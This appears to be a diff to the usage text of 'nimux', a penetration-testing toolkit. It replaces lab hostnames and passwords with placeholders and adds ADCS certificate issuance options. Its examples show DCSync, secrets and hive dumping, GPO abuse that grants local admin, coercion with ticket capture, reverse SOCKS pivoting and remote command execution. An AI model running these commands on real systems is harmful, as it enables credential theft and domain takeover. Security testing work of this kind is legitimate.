@@ -310,8 +310,10 @@ type
     ldapAdcs: bool
     ldapAdcsRequest: bool
     ldapAdcsAuth: bool
+    ldapAdcsIssue: string
     ldapAdcsCa: string
     ldapAdcsTemplate: string
+    ldapAdcsRequestId: uint32
     ldapAdcsRpc: bool
     ldapAdcsOut: string
     ldapAdcsPfx: string
@@ -324,6 +326,7 @@ type
     ldapAdcsPolicySet: bool
     ldapAdcsGetEditFlags: bool
     ldapAdcsGetDisableExtensionList: bool
+    ldapAdcsGetCaSecurity: bool
     ldapAdcsSetEditFlags: string
     ldapAdcsSetDisableExtensionListPresent: bool
     ldapAdcsSetDisableExtensionList: string
@@ -458,13 +461,13 @@ NOTES
   port to be reachable from your machine.
 
 EXAMPLES
-  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --reverse --listener 10.10.14.5
-  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --reverse --listener 10.10.14.5 --socks-port 1080 --control-port 1081
-  nimux socks dc01.garfield.htb -k --ccache admin.ccache -d garfield.htb --krb5-config krb5.conf --reverse --listener 10.10.14.5
-  nimux socks pivot01 -u ubuntu -p 'Pass' --linux --reverse --listener 10.10.14.5
-  nimux socks pivot01 -u ubuntu --ssh-key ~/.ssh/id_rsa --linux --reverse --listener 10.10.14.5
-  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --bind 0.0.0.0 --socks-port 1080 --auth user:pass
-  nimux socks dc01.garfield.htb -u j.arbuckle -p 'Pass' -d garfield.htb --kill --pid 4812 --socks-task nimproxy0abc123 --remote 'C:\Users\...\nimproxyXXXX.exe'
+  nimux socks dc01.example.local -u operator -p '<password>' -d example.local --reverse --listener 192.0.2.50
+  nimux socks dc01.example.local -u operator -p '<password>' -d example.local --reverse --listener 192.0.2.50 --socks-port 1080 --control-port 1081
+  nimux socks dc01.example.local -k --ccache <ccache> -d example.local --krb5-config krb5.conf --reverse --listener 192.0.2.50
+  nimux socks pivot01 -u ubuntu -p '<password>' --linux --reverse --listener 192.0.2.50
+  nimux socks pivot01 -u ubuntu --ssh-key ~/.ssh/id_rsa --linux --reverse --listener 192.0.2.50
+  nimux socks dc01.example.local -u operator -p '<password>' -d example.local --bind 0.0.0.0 --socks-port 1080 --auth user:pass
+  nimux socks dc01.example.local -u operator -p '<password>' -d example.local --kill --pid 4812 --socks-task nimproxy0abc123 --remote 'C:\Users\...\nimproxyXXXX.exe'
 """
 
 proc usageScan() =
@@ -563,7 +566,7 @@ ENUMERATION (require -u/-p or -H)
                        Trigger MS-RPRN coercion to the listener
   --coerce-target <s>  Spooler host to coerce when main target is the listener
   --capture-tickets    Deploy native ticket monitor on --capture-host
-  --capture-host <s>   Host where tickets are captured, e.g. <listener-host>.FOREST.AD
+  --capture-host <s>   Host where tickets are captured, e.g. <listener-host>.FOREST.EXAMPLE.LOCAL
   --capture-user <s>   Capture-host username (defaults to -u)
   --capture-hash <s>   Capture-host NT hash (defaults to -H)
   --capture-domain <s> Capture-host domain (defaults to -d)
@@ -581,15 +584,15 @@ OUTPUT
   --json               Emit one JSON object per target on stdout
 
 EXAMPLES
-  nimux smb dc01 -u alice -p 'Pass123!' --shares --users --pass-pol
-  nimux smb dc01 -u alice -H aad3b...:31d6c... --rid-brute 5000
-  nimux smb files01 -u alice -p '<password>' --spider --max-depth 3 --interesting
-  nimux smb files01 -u alice -p '<password>' --spider --share Shared \
+  nimux smb dc01 -u operator -p '<password>' --shares --users --pass-pol
+  nimux smb dc01 -u operator -H aad3b...:31d6c... --rid-brute 5000
+  nimux smb files01 -u operator -p '<password>' --spider --max-depth 3 --interesting
+  nimux smb files01 -u operator -p '<password>' --spider --share Shared \
       --spider-pattern '*.kdbx,*.config,*password*' --json
-  nimux smb <listener-host>.FOREST.AD -u Administrator -H <nthash> -d FOREST.AD \
-      --coerce --coerce-target <spooler-host>.CHILD.FOREST.AD \
-      --listener <listener-host>.FOREST.AD \
-      --capture-tickets --capture-host <listener-host>.FOREST.AD \
+  nimux smb <listener-host>.FOREST.EXAMPLE.LOCAL -u <admin> -H <nthash> -d FOREST.EXAMPLE.LOCAL \
+      --coerce --coerce-target <spooler-host>.CHILD.FOREST.EXAMPLE.LOCAL \
+      --listener <listener-host>.FOREST.EXAMPLE.LOCAL \
+      --capture-tickets --capture-host <listener-host>.FOREST.EXAMPLE.LOCAL \
       --ticket-user '<machine-account>$' --ticket-service krbtgt \
       --capture-seconds 20 --capture-interval 1 --capture-out captured-ticket
 """
@@ -652,6 +655,9 @@ ATTACK SHORTCUTS
   --adcs-request --adcs-rpc --ca <name> --template <name> [--out <prefix>]
   --adcs-request --adcs-rpc --ca <name> --template <name> --on-behalf-of <domain\\user> [--cert <ea.cer> --key <ea.key>]
   --adcs-auth --upn <user@realm> --pfx <file> --ccache <file>
+  --adcs-issue <id> --ca <name>
+  --adcs-request --ca <name> --request-id <id> --key <private.key> [--out <prefix>]
+  --adcs-policy --ca <name> --adcs-get-ca-security
   --adcs-policy --ca <name> --adcs-get-editflags
   --adcs-policy --ca <name> --adcs-get-disable-extension-list
   --adcs-policy --ca <name> --adcs-set-editflags <value>
@@ -721,48 +727,48 @@ EXAMPLES
   nimux ldap dc01 -u admin -p pass -d domain --modify --dn "CN=user,CN=Users,DC=domain" --add "description=Hacked"
 
 GPO EXAMPLES
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --create-gpo --name WorkstationLocalAdmin
 
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --delegate --name WorkstationLocalAdmin \
-      --principal 'CORP\<target-user>' --rights FullControl
+      --principal 'EXAMPLE\<target-user>' --rights FullControl
 
-  nimux ldap dc01.corp.local -u <gpo-linker> -p '<password>' -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-linker> -p '<password>' -d EXAMPLE.LOCAL \
       --gpo --link WorkstationLocalAdmin \
-      --target 'OU=Workstations,DC=CORP,DC=LOCAL'
+      --target 'OU=Workstations,DC=EXAMPLE,DC=LOCAL'
 
-  nimux ldap dc01.corp.local -u <gpo-linker> -p '<password>' -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-linker> -p '<password>' -d EXAMPLE.LOCAL \
       --gpo --link WorkstationLocalAdmin \
-      --target 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=CORP,DC=LOCAL'
+      --target 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EXAMPLE,DC=LOCAL'
 
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --startup --name WorkstationLocalAdmin \
       --put ./startup.bat --script-params 'arg1 arg2'
 
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --schtask --name WorkstationLocalAdmin \
       --task-name NimexecAdmin --task-cmd 'cmd.exe' \
-      --task-args '/c net localgroup Administrators CORP\<target-user> /add' \
+      --task-args '/c net localgroup Administrators EXAMPLE\<target-user> /add' \
       --task-user SYSTEM
 
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --put ./GptTmpl.inf --name WorkstationLocalAdmin \
       --remote 'Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
 
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --put ./GPT.INI --name WorkstationLocalAdmin --remote GPT.INI
 
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --set --name WorkstationLocalAdmin --replace versionNumber=2 \
       --replace 'gPCMachineExtensionNames=[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]'
 
-  nimux ldap dc01.corp.local -u <gpo-creator> -H <nthash> -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-creator> -H <nthash> -d EXAMPLE.LOCAL \
       --gpo --ls --name WorkstationLocalAdmin --remote 'Machine'
 
-  nimux ldap dc01.corp.local -u <gpo-linker> -p '<password>' -d CORP.LOCAL \
+  nimux ldap dc01.example.local -u <gpo-linker> -p '<password>' -d EXAMPLE.LOCAL \
       --gpo --unlink WorkstationLocalAdmin \
-      --target 'OU=Workstations,DC=CORP,DC=LOCAL'
+      --target 'OU=Workstations,DC=EXAMPLE,DC=LOCAL'
 """
 
 proc usageWinrm() =
@@ -805,9 +811,9 @@ OUTPUT
   --json               Emit JSON
 
 EXAMPLES
-  nimux winrm dc01 -u admin -p Pass --cmd "whoami /priv"
+  nimux winrm dc01 -u admin -p '<password>' --cmd "whoami /priv"
   nimux winrm dc01 -u admin -H aad3b...:31d6c... --cmd "Get-Process | select -f 5"
-  nimux winrm dc01 -u admin -p Pass --ssl
+  nimux winrm dc01 -u admin -p '<password>' --ssl
 """
 
 proc usageMssql() =
@@ -818,7 +824,7 @@ USAGE
   nimux mssql <target>... [options]
 
 AUTHENTICATION
-  -u, --username <s>   Username (SQL login name, or CORP\user for Windows auth)
+  -u, --username <s>   Username (SQL login name, or EXAMPLE\user for Windows auth)
   -p, --password <s>   Plaintext password
   -H, --hash <s>       NT hash (32 hex) or LM:NT pair - triggers SSPI/Windows auth
   -d, --domain <s>     Active Directory domain - triggers SSPI/Windows auth
@@ -867,14 +873,14 @@ OUTPUT
   --json               Emit JSON including result sets
 
 EXAMPLES
-  nimux mssql sql01 -u sa -p Pass
-  nimux mssql sql01 -u sa -p Pass --query "SELECT name FROM sys.databases"
-  nimux mssql sql01 -u sa -p Pass --query-file report.sql
-  nimux mssql sql01 -u sa -p Pass --cmd "whoami /priv"
-  nimux mssql sql01 -u sa -p Pass --ole "whoami"
-  nimux mssql sql01 -u sa -p Pass --clr "whoami"
-  nimux mssql sql01 -u sa -p Pass --shell
-  nimux mssql sql01 -u sa -p Pass --cli
+  nimux mssql sql01 -u sa -p '<password>'
+  nimux mssql sql01 -u sa -p '<password>' --query "SELECT name FROM sys.databases"
+  nimux mssql sql01 -u sa -p '<password>' --query-file report.sql
+  nimux mssql sql01 -u sa -p '<password>' --cmd "whoami /priv"
+  nimux mssql sql01 -u sa -p '<password>' --ole "whoami"
+  nimux mssql sql01 -u sa -p '<password>' --clr "whoami"
+  nimux mssql sql01 -u sa -p '<password>' --shell
+  nimux mssql sql01 -u sa -p '<password>' --cli
 
 CLI HELPERS
   help                 Local command list
@@ -939,7 +945,7 @@ USAGE
   nimux scm <target> -u <user> {-p <pass>|-H <hash>} --cmd "<command>"
 
 AUTHENTICATION
-  -u, --username <s>   Username (typically Administrator or domain admin)
+  -u, --username <s>   Username (typically <admin> or domain admin)
   -p, --password <s>   Plaintext password
   -H, --hash <s>       NT hash (32 hex) or LM:NT pair
   -d, --domain <s>     Domain
@@ -978,8 +984,8 @@ CAVEATS
   service context and produce no output - use winrm/wmi/svc for those.
 
 EXAMPLES
-  nimux scm dc01 -u Administrator -p Pass --cmd "dir C:\\"
-  nimux scm dc01 -u Administrator -H aad3b...:31d6c... --cmd "ipconfig /all"
+  nimux scm dc01 -u <admin> -p '<password>' --cmd "dir C:\\"
+  nimux scm dc01 -u <admin> -H aad3b...:31d6c... --cmd "ipconfig /all"
 """
 
 proc usageFtp() =
@@ -1011,10 +1017,10 @@ CLI COMMANDS
   rm <path>            Remove file or directory
 
 EXAMPLES
-  nimux ftp 10.0.0.5
-  nimux ftp 10.0.0.5 -u <user> -p '<password>'
-  nimux ftp 10.0.0.5 -u <user> -p '<password>' --ls
-  nimux ftp 10.0.0.5 -u <user> -p '<password>' --cli
+  nimux ftp 192.0.2.10
+  nimux ftp 192.0.2.10 -u <user> -p '<password>'
+  nimux ftp 192.0.2.10 -u <user> -p '<password>' --ls
+  nimux ftp 192.0.2.10 -u <user> -p '<password>' --cli
 """
 
 proc usageMysql() =
@@ -1043,9 +1049,9 @@ CLI COMMANDS
   <sql> \              Continue SQL on the next line
 
 EXAMPLES
-  nimux mysql 10.0.0.5 -u <user> -p '<password>'
-  nimux mysql 10.0.0.5 -u root -p ''
-  nimux mysql 10.0.0.5 -u root -p '' --cli
+  nimux mysql 192.0.2.10 -u <user> -p '<password>'
+  nimux mysql 192.0.2.10 -u root -p ''
+  nimux mysql 192.0.2.10 -u root -p '' --cli
 """
 
 proc usagePostgres() =
@@ -1088,11 +1094,11 @@ SHELL COMMANDS
   <command>            Run OS command via COPY FROM PROGRAM
 
 EXAMPLES
-  nimux postgres 10.0.0.5 -u postgres -p '<password>'
-  nimux postgres 10.0.0.5 -u postgres -p '<password>' --query "SELECT version()"
-  nimux postgres 10.0.0.5 -u postgres -p '<password>' --cmd "id"
-  nimux postgres 10.0.0.5 -u postgres -p '<password>' --shell
-  nimux postgres 10.0.0.5 -u postgres -p '<password>' --database template1 --cli
+  nimux postgres 192.0.2.10 -u postgres -p '<password>'
+  nimux postgres 192.0.2.10 -u postgres -p '<password>' --query "SELECT version()"
+  nimux postgres 192.0.2.10 -u postgres -p '<password>' --cmd "id"
+  nimux postgres 192.0.2.10 -u postgres -p '<password>' --shell
+  nimux postgres 192.0.2.10 -u postgres -p '<password>' --database template1 --cli
 """
 
 proc usageNfs() =
@@ -1123,9 +1129,9 @@ CLI COMMANDS
   sshkey <pub> [path]  Write SSH public key to authorized_keys
 
 EXAMPLES
-  nimux nfs 10.0.0.5
-  nimux nfs 10.0.0.5 --port 111
-  nimux nfs 10.0.0.5 --cli
+  nimux nfs 192.0.2.10
+  nimux nfs 192.0.2.10 --port 111
+  nimux nfs 192.0.2.10 --cli
 """
 
 proc usageHttp() =
@@ -1174,14 +1180,14 @@ OPTIONS
   --json               Emit JSON
 
 EXAMPLES
-  nimux http 10.0.0.5
-  nimux http 10.0.0.5 --path /admin
-  nimux http app.htb --dirs raft-small-words.txt --workers 100 --status 200,301,302,403 --baseline
-  nimux http app.htb --dirs raft-small-words.txt --auto-calibrate --recursion --depth 2 --extract-links
-  nimux http app.htb --files raft-small-files.txt --extensions php,txt --filter-regex 'Not Found' -fs 325 --resume seen.jsonl
-  nimux http 10.0.0.5 --vhosts vhosts.txt -d app.htb --workers 100
-  nimux dns app.htb --subdomains subdomains.txt --workers 200
-  nimux https 10.0.0.5 -u <user> -p '<password>' --path /dav/
+  nimux http 192.0.2.10
+  nimux http 192.0.2.10 --path /admin
+  nimux http app.example.local --dirs raft-small-words.txt --workers 100 --status 200,301,302,403 --baseline
+  nimux http app.example.local --dirs raft-small-words.txt --auto-calibrate --recursion --depth 2 --extract-links
+  nimux http app.example.local --files raft-small-files.txt --extensions php,txt --filter-regex 'Not Found' -fs 325 --resume seen.jsonl
+  nimux http 192.0.2.10 --vhosts vhosts.txt -d app.example.local --workers 100
+  nimux dns app.example.local --subdomains subdomains.txt --workers 200
+  nimux https 192.0.2.10 -u <user> -p '<password>' --path /dav/
 """
 
 proc usageSsh() =
@@ -1200,9 +1206,9 @@ EXECUTION
   --shell              Open an interactive shell session
 
 EXAMPLES
-  nimux ssh 10.0.0.5 -u <user> -p '<password>'
-  nimux ssh 10.0.0.5 -u <user> -p '<password>' --cmd "id"
-  nimux ssh 10.0.0.5 -u <user> -p '<password>' --shell
+  nimux ssh 192.0.2.10 -u <user> -p '<password>'
+  nimux ssh 192.0.2.10 -u <user> -p '<password>' --cmd "id"
+  nimux ssh 192.0.2.10 -u <user> -p '<password>' --shell
 """
 
 proc usageAfp() =
@@ -1234,9 +1240,9 @@ CLI COMMANDS
   mkdir <dir>          Create directory
 
 EXAMPLES
-  nimux afp 10.0.0.5
-  nimux afp 10.0.0.5 -u <user> -p '<password>'
-  nimux afp 10.0.0.5 -u <user> -p '<password>' --cli
+  nimux afp 192.0.2.10
+  nimux afp 192.0.2.10 -u <user> -p '<password>'
+  nimux afp 192.0.2.10 -u <user> -p '<password>' --cli
 """
 
 proc usageWebDav() =
@@ -1268,11 +1274,11 @@ CLI COMMANDS
   rm <path>            Remove file or directory
 
 EXAMPLES
-  nimux webdav 10.0.0.5
-  nimux webdav 10.0.0.5 -u <user> -p '<password>'
-  nimux webdav 10.0.0.5 --ssl
-  nimux webdav 10.0.0.5 --ssl -u <user> -p '<password>'
-  nimux webdav 10.0.0.5 --ssl -u <user> -p '<password>' --cli
+  nimux webdav 192.0.2.10
+  nimux webdav 192.0.2.10 -u <user> -p '<password>'
+  nimux webdav 192.0.2.10 --ssl
+  nimux webdav 192.0.2.10 --ssl -u <user> -p '<password>'
+  nimux webdav 192.0.2.10 --ssl -u <user> -p '<password>' --cli
 """
 
 proc usageVnc() =
@@ -1286,8 +1292,8 @@ AUTHENTICATION
   -p, --password <s>   VNC password
 
 EXAMPLES
-  nimux vnc 10.0.0.5 -p '<password>'
-  nimux vnc 10.0.0.5
+  nimux vnc 192.0.2.10 -p '<password>'
+  nimux vnc 192.0.2.10
 """
 
 proc usageKrb5Conf() =
@@ -1298,15 +1304,15 @@ USAGE
   nimux krb5conf <kdc-host> -d <domain> [--realm <REALM>] [--out <file>] [--ca <pem>]
 
 OPTIONS
-  -d, --domain <s>     DNS domain, e.g. garfield.htb
+  -d, --domain <s>     DNS domain, e.g. example.local
   --realm <s>          Kerberos realm (default: uppercase domain)
   --out <file>         Output path (default: ./krb5.conf)
   --ca <file>          Optional CA PEM path for PKINIT anchors
   --json               Emit JSON summary instead of text
 
 EXAMPLES
-  nimux krb5conf dc01.garfield.htb -d garfield.htb --out krb5.conf
-  nimux krb5conf 10.129.244.207 -d garfield.htb --realm GARFIELD.HTB --ca ca.pem
+  nimux krb5conf dc01.example.local -d example.local --out krb5.conf
+  nimux krb5conf 192.0.2.10 -d example.local --realm EXAMPLE.LOCAL --ca ca.pem
 """
 
 proc usageKerberos() =
@@ -1345,10 +1351,10 @@ KERBEROS OPTIONS
   --krb5-config <file>    Kerberos config generated by nimux krb5conf
 
 EXAMPLES
-  nimux kerberos dc01.corp.local -d corp.local -u alice -p Pass --request kinit --out alice.ccache
-  nimux kerberos dc01.corp.local -d corp.local --request getst --ccache alice.ccache --service cifs/dc01.corp.local --out cifs.ccache
-  nimux kerberos dc01.corp.local -d corp.local --request s4u --ccache svc.ccache --user Administrator --service cifs/server.corp.local --out admin-cifs.ccache
-  nimux kerberos dc01.corp.local -d corp.local --request kirbi-to-ccache --kirbi ticket.kirbi --out ticket.ccache
+  nimux kerberos dc01.example.local -d example.local -u operator -p '<password>' --request kinit --out <ccache>
+  nimux kerberos dc01.example.local -d example.local --request getst --ccache <ccache> --service cifs/dc01.example.local --out <out-ccache>
+  nimux kerberos dc01.example.local -d example.local --request s4u --ccache <service-ccache> --user <admin> --service cifs/server.example.local --out <out-ccache>
+  nimux kerberos dc01.example.local -d example.local --request kirbi-to-ccache --kirbi <ticket.kirbi> --out <ccache>
 """
 
 proc usage(forCommand = "") =
@@ -1380,7 +1386,7 @@ USAGE
   nimux bin <target> -u <user> {-p <pass>|-H <hash>} --cmd "<command>"
 
 AUTHENTICATION
-  -u, --username <s>   Username (typically Administrator or domain admin)
+  -u, --username <s>   Username (typically <admin> or domain admin)
   -p, --password <s>   Plaintext password
   -H, --hash <s>       NT hash (32 hex) or LM:NT pair
   -d, --domain <s>     Domain
@@ -1422,8 +1428,8 @@ CAVEATS
   binary. Requires write to ADMIN$ and SCM access (typically local admin).
 
 EXAMPLES
-  nimux bin dc01 -u Administrator -p Pass --cmd whoami
-  nimux bin dc01 -u Administrator -H aad3b...:31d6c... --cmd "tasklist"
+  nimux bin dc01 -u <admin> -p '<password>' --cmd whoami
+  nimux bin dc01 -u <admin> -H aad3b...:31d6c... --cmd "tasklist"
 """
     return
   of "tsch":
@@ -1437,7 +1443,7 @@ ALIASES
   task, sch, schtask, atexec
 
 AUTHENTICATION
-  -u, --username <s>   Username (typically Administrator or domain admin)
+  -u, --username <s>   Username (typically <admin> or domain admin)
   -p, --password <s>   Plaintext password
   -H, --hash <s>       NT hash (32 hex) or LM:NT pair
   -d, --domain <s>     Domain
@@ -1468,8 +1474,8 @@ OUTPUT
   --json               Emit JSON
 
 EXAMPLES
-  nimux task dc01 -u Administrator -p Pass --cmd whoami
-  nimux sch dc01 -u Administrator -H aad3b...:31d6c... --cmd "ipconfig /all"
+  nimux task dc01 -u <admin> -p '<password>' --cmd whoami
+  nimux sch dc01 -u <admin> -H aad3b...:31d6c... --cmd "ipconfig /all"
 """
     return
   of "mmc":
@@ -1512,9 +1518,9 @@ PROTOCOL TUNING
   --timeout <ms>       Per-operation timeout
 
 EXAMPLES
-  nimux mmc dc01 -u Administrator -p Pass --cmd whoami
-  nimux mmc dc01 -u Administrator -p Pass --cmd whoami --object ShellWindows
-  nimux mmc dc01 -u Administrator -H aad3b...:31d6c... --cmd "ipconfig /all"
+  nimux mmc dc01 -u <admin> -p '<password>' --cmd whoami
+  nimux mmc dc01 -u <admin> -p '<password>' --cmd whoami --object ShellWindows
+  nimux mmc dc01 -u <admin> -H aad3b...:31d6c... --cmd "ipconfig /all"
 """
     return
   of "dcsync":
@@ -1542,8 +1548,8 @@ OUTPUT
   --json               Emit JSON (one object per line)
 
 EXAMPLES
-  nimux dcsync dc01 -u Administrator -p Pass -d CORP --user "CORP\\krbtgt"
-  nimux dcsync dc01 -u Administrator -H aad3b...:31d6c... -d CORP
+  nimux dcsync dc01 -u <admin> -p '<password>' -d EXAMPLE --user "EXAMPLE\\krbtgt"
+  nimux dcsync dc01 -u <admin> -H aad3b...:31d6c... -d EXAMPLE
 """
     return
   of "secrets":
@@ -1597,13 +1603,13 @@ WHAT IT DUMPS
   - Kerberos keys via DCSync
 
 EXAMPLES
-  nimux secrets 192.168.1.10 -u Administrator -p Password123
-  nimux secrets dc01.corp.local -u CORP\\admin -H <nthash> -d corp.local
-  KRB5CCNAME=admin.ccache nimux secrets dc01.corp.local -k -u Administrator -d CORP
-  KRB5CCNAME=admin.ccache nimux secrets dc01.corp.local -k -u Administrator -d CORP --backup-hives --remote 'C:\Windows\Temp' --json
-  nimux secrets dc01.corp.local --sam SAM.save --security SECURITY.save --system SYSTEM.save -d corp.local
-  nimux secrets dc01.corp.local -u Administrator -H <nthash> -d corp.local --online
-  nimux secrets dc01.corp.local -u Administrator -H <nthash> -d corp.local --online --exec svc
+  nimux secrets 192.0.2.10 -u <admin> -p <password>
+  nimux secrets dc01.example.local -u EXAMPLE\\admin -H <nthash> -d example.local
+  KRB5CCNAME=<ccache> nimux secrets dc01.example.local -k -u <admin> -d EXAMPLE
+  KRB5CCNAME=<ccache> nimux secrets dc01.example.local -k -u <admin> -d EXAMPLE --backup-hives --remote 'C:\Windows\Temp' --json
+  nimux secrets dc01.example.local --sam SAM.save --security SECURITY.save --system SYSTEM.save -d example.local
+  nimux secrets dc01.example.local -u <admin> -H <nthash> -d example.local --online
+  nimux secrets dc01.example.local -u <admin> -H <nthash> -d example.local --online --exec svc
 """
     return
   of "cim":
@@ -1645,9 +1651,9 @@ PROTOCOL TUNING
   --timeout <ms>       Per-operation timeout
 
 EXAMPLES
-  nimux cim dc01 -u Administrator -p Pass --cmd "ipconfig /all"
-  nimux cim dc01 -u Administrator -H 31d6cfe0...:31d6cfe0... --cmd whoami
-  nimux cim dc01 -u Administrator -p Pass --shell
+  nimux cim dc01 -u <admin> -p '<password>' --cmd "ipconfig /all"
+  nimux cim dc01 -u <admin> -H 31d6cfe0...:31d6cfe0... --cmd whoami
+  nimux cim dc01 -u <admin> -p '<password>' --shell
 """
     return
   of "ls":
@@ -1667,10 +1673,13 @@ AUTHENTICATION
   -p, --password <s>   Plaintext password
   -H, --hash <s>       NT hash or LM:NT
   -d, --domain <s>     Domain
+  -k, --kerberos       Use Kerberos for SMB session setup
+  --ccache <file>      Ticket cache to use with -k
+  --krb5-config <file> Kerberos config generated with nimux krb5conf
 
 EXAMPLES
-  nimux ls dc01 -u admin -p Pass --share C\$
-  nimux ls dc01 -u admin -p Pass --share Users --remote 'Public\Documents'
+  nimux ls dc01 -u admin -p '<password>' --share C\$
+  nimux ls dc01 -u admin -p '<password>' --share Users --remote 'Public\Documents'
 """
     return
   of "put", "get", "rm", "mkdir":
@@ -1686,6 +1695,9 @@ AUTHENTICATION
   -p, --password <s>   Plaintext password
   -H, --hash <s>       NT hash (32 hex) or LM:NT pair
   -d, --domain <s>     Domain
+  -k, --kerberos       Use Kerberos for SMB session setup
+  --ccache <file>      Ticket cache to use with -k
+  --krb5-config <file> Kerberos config generated with nimux krb5conf
 
 PATH OPTIONS
   --share <name>       Share to mount, e.g. ADMIN$, C$, Users, MyShare
@@ -1699,12 +1711,12 @@ PROTOCOL TUNING
   --timeout <ms>       Per-operation timeout
 
 EXAMPLES
-  nimux put dc01 -u admin -p Pass \
+  nimux put dc01 -u admin -p '<password>' \
       --share ADMIN$ --remote Temp\loader.exe --local ./loader.exe
-  nimux get dc01 -u admin -p Pass \
+  nimux get dc01 -u admin -p '<password>' \
       --share C$ --remote 'Users\Public\out.txt' --local ./out.txt
-  nimux mkdir dc01 -u admin -p Pass --share C$ --remote Temp\nimux
-  nimux rm dc01 -u admin -p Pass --share C$ --remote Temp\nimux\file.txt
+  nimux mkdir dc01 -u admin -p '<password>' --share C$ --remote Temp\nimux
+  nimux rm dc01 -u admin -p '<password>' --share C$ --remote Temp\nimux\file.txt
 """
     return
   else: discard
@@ -1843,37 +1855,37 @@ EXAMPLES
     nimux scan 2001:db8::1 --port 22,80,443
 
   Web discovery
-    nimux http app.htb --dirs raft-small-words.txt --workers 100 --status 200,301,302,403 --baseline
-    nimux http app.htb --dirs raft-small-words.txt --auto-calibrate --recursion --depth 2 --extract-links
-    nimux http app.htb --files raft-small-files.txt --extensions php,txt,bak --workers 100 --filter-regex 'Not Found' -fs 325
-    nimux http 10.0.0.5 --vhosts vhosts.txt -d app.htb --workers 100 --resume seen.jsonl --json
-    nimux dns app.htb --subdomains subdomains.txt --workers 200 --json
+    nimux http app.example.local --dirs raft-small-words.txt --workers 100 --status 200,301,302,403 --baseline
+    nimux http app.example.local --dirs raft-small-words.txt --auto-calibrate --recursion --depth 2 --extract-links
+    nimux http app.example.local --files raft-small-files.txt --extensions php,txt,bak --workers 100 --filter-regex 'Not Found' -fs 325
+    nimux http 192.0.2.10 --vhosts vhosts.txt -d app.example.local --workers 100 --resume seen.jsonl --json
+    nimux dns app.example.local --subdomains subdomains.txt --workers 200 --json
 
   SMB / AD enumeration
-    nimux smb dc01 -u alice -p Pass123! --shares --users --pass-pol
-    nimux smb dc01 -u alice -H aad3b...:31d6c... --rid-brute 5000
+    nimux smb dc01 -u operator -p '<password>' --shares --users --pass-pol
+    nimux smb dc01 -u operator -H aad3b...:31d6c... --rid-brute 5000
     nimux ldap dc01 --query dcs --query kerberoast --query trusts
-    nimux ldap dc01 -u alice -p Pass -d corp.local --create computer --name <computer-name>$ --new-pass 'Passw0rd!123'
-    nimux ldap dc01 -u ryan.brooks -k -d corp.local --create dmsa --name fakeDMSA --ou "OU=DMSAHolder,DC=corp,DC=local" --target-dn "CN=svc_deploy,OU=ServiceAccounts,DC=corp,DC=local" --out fakeDMSA.ccache
-    nimux kerberos dc01 -u alice -p Pass -d corp.local --request kinit --out alice.ccache
-    nimux kerberos dc01 --request describe --ccache alice.ccache --json
-    nimux kerberos dc01 --request ccache-to-kirbi --ccache alice.ccache --out alice.kirbi
-    nimux kerberos dc01 --request kirbi-to-ccache --kirbi alice.kirbi --out alice.ccache
+    nimux ldap dc01 -u operator -p '<password>' -d example.local --create computer --name <computer-name>$ --new-pass '<password>'
+    nimux ldap dc01 -u operator -k -d example.local --create dmsa --name fakeDMSA --ou "OU=DMSAHolder,DC=example,DC=local" --target-dn "CN=svc_deploy,OU=ServiceAccounts,DC=example,DC=local" --out fakeDMSA.ccache
+    nimux kerberos dc01 -u operator -p '<password>' -d example.local --request kinit --out <ccache>
+    nimux kerberos dc01 --request describe --ccache <ccache> --json
+    nimux kerberos dc01 --request ccache-to-kirbi --ccache <ccache> --out <ticket.kirbi>
+    nimux kerberos dc01 --request kirbi-to-ccache --kirbi <ticket.kirbi> --out <ccache>
 
   Authenticated execution
-    nimux winrm dc01 -u admin -p Pass --cmd "Get-Process | select -f 5"
+    nimux winrm dc01 -u admin -p '<password>' --cmd "Get-Process | select -f 5"
     nimux scm dc01 -u admin -H aad3b...:31d6c... --cmd "dir C:\\"
-    nimux bin     dc01 -u admin -p Pass --cmd whoami
-    nimux mssql sql01 -u sa -p Pass --query "SELECT @@version"
-    nimux mssql sql01 -u sa -p Pass --cmd "ipconfig /all"
+    nimux bin     dc01 -u admin -p '<password>' --cmd whoami
+    nimux mssql sql01 -u sa -p '<password>' --query "SELECT @@version"
+    nimux mssql sql01 -u sa -p '<password>' --cmd "ipconfig /all"
 
   Secrets
-    KRB5CCNAME=admin.ccache nimux secrets dc01.corp.local -k -u Administrator -d CORP --backup-hives --remote 'C:\Windows\Temp' --json
-    nimux secrets LOCAL --sam SAM.save --security SECURITY.save --system SYSTEM.save -d corp.local
